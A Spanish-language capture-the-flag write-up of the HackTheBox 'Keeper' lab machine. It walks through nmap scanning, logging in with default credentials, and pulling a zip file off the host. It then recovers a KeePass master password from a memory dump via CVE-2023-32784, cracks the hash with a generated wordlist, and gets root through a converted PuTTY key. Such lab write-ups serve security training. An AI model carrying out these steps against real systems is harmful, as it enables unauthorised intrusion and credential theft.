---
title: HackTheBox - Keeper
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Default Credentials', 'Keepass Dump (CVE-2023-32784)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Keeper/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Keeper Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Default Credentials, Keepass Dump (CVE-2023-32784)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Keeper`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Keeper/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos**

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Keeper/02-versions.png)


> Al visitar la página web veremos un host, el cual añadimos al archivo **`/etc/hosts`**
{: .prompt-info }

![](/assets/images/HTB/Easy/Keeper/03-web.png)


* Al visitar el host **tickets.keeper.htb** vemos el siguiente logo

    ![](/assets/images/HTB/Easy/Keeper/04-logo.png)

* Si buscamos por credenciales por defecto veremos **root:password**, después de autenticarnos buscamos usuarios válidos

    ![](/assets/images/HTB/Easy/Keeper/05-users.png)

* Seleccionamos al usuario **lnorgaard** y en su descripción obtendremos una contraseña válida para **SSH**

    ![](/assets/images/HTB/Easy/Keeper/06-pass.png)

d. Nos autenticamos en el servicio **SSH**

```bash
root@kali> ssh lnorgaard@10.10.11.227
lnorgaard@keeper:~$ 
```

### Escalada de Privilegios 💹

a. En nuestro directorio personal veremos una archivo **.zip**

```bash
lnorgaard@keeper:~$ ls -la
total 332856
<SNIP>
-rw-r--r-- 1 root      root       87391651 Aug 25 05:44 RT30000.zip
```

* Transferimos este archivo a nuestra máquina atacante para analizarlo

    ```bash
    lnorgaard@keeper:~$ python3 -m http.server 4444
    --------------------------------------------------------
    root@kali> wget http://<IP Keeper>:4444/RT30000.zip -o-
    root@kali> unzip RT30000.zip
    root@kali> ls
    -rw-r--r-- 1 root root 253395188 May 24 05:51 KeePassDumpFull.dmp
    -rw-r--r-- 1 root root      3629 Aug 23 12:43 passcodes.kdbx
    ```

b. Extraemos el hash del fichero **.kdbx** (**`keepass2john passcodes.kdbx > hash`**), como tenemos un archivo **.dmp** buscamos sobre al relacionado a **Keepass** y **.dmp**

* Nos encontramos con [CVE-2023-32784](https://github.com/vdohney/keepass-password-dumper), vemos que a través de un archivo **.dmp** de Keepass podemos llegar a obtener la contraseña en texto claro

    ```bash
    root@kali> dotnet run KeePassDumpFull.dmp 
    1.:     ●
    2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
    3.:     d, 
    4.:     g, 
    5.:     r, 
    6.:     ø, 
    7.:     d, 
    8.:      , 
    9.:     m, 
    10.:    e, 
    11.:    d, 
    12.:     , 
    13.:    f, 
    14.:    l, 
    15.:    ø, 
    16.:    d, 
    17.:    e, 
    Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
    ```
    > El primer carácter no fue capaz de extraerse y el segundo puede ser cualquiera entre **{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}**


    > En caso de obtener un error al ejecutar el comando anterior, modificamos el fichero **`keepass_password_dumper.csproj`** con esto:
    {: .prompt-tip }


    ```xml
    <Project Sdk="Microsoft.NET.Sdk">
        <PropertyGroup>
        <OutputType>Exe</OutputType>
        <TargetFramework>net6.0</TargetFramework>
        <ImplicitUsings>enable</ImplicitUsings>
        <Nullable>enable</Nullable>
        </PropertyGroup>
    </Project>
    ```

c. Creamos un script en **python** para crear un diccionario con posibles contraseñas basándonos en el output del script

```python
import string
possible_password = 'dgrød med fløde'

string_global = string.ascii_letters + string.digits + string.punctuation
posible_second_character = "øÏl`-',]§AI:=_cM"

for second in posible_second_character:
	for letter in string_global:
		partial = second + possible_password 
		print(letter + partial)
```

```bash
python3 script.py > possible_passwords.txt
```

* Crackeamos el hash usando el diccionario creado previamente

    ```bash
    root@kali> john hash -w=./possible_passwords.txt 
    ```

d. Con la credencial obtenida podemos leer el contenido del fichero **passcodes.kdbx**

![](/assets/images/HTB/Easy/Keeper/07-keepass.png)

* El usuario root tiene una clave **Putty** y para transformarla a pares de claves **SSH**, copiamos esta clave en una archivo **.ppk** y usamos este [blog](https://www.baeldung.com/linux/ssh-key-types-convert-ppk)

```bash
root@kali> puttygen file.ppk -O public-openssh -o id_rsa.pub
root@kali> puttygen file.ppk -O private-openssh -o id_rsa
root@kali> chmod 600 id_rsa
```

c. La clave **id_rsa** nos sirve para autenticarnos en el servicio **SSH** como el usuario root

```bash
root@kali> ssh root@<IP Keeper> -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

root@keeper:~#
```